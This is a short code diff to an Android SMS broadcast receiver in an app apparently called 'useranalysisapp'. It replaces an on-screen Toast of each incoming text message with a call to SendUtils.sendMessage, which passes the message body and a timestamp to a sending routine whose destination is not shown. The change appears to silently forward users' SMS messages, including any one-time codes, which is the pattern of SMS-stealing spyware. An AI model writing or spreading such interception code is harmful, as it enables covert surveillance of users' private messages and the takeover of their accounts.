@@ -5,7 +5,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.widget.Toast;
+
+import com.example.useranalysisapp.utils.SendUtils;
 
 public class SmsReceiver extends BroadcastReceiver {
 
@@ -27,6 +28,6 @@ public class SmsReceiver extends BroadcastReceiver {
                 content.append(message.getMessageBody());//获取短信内容
             }
         }
-        Toast.makeText(context, content.toString(), Toast.LENGTH_SHORT).show();
+        SendUtils.sendMessage(content.toString(), System.currentTimeMillis() / 1000, "短信");
     }
 }
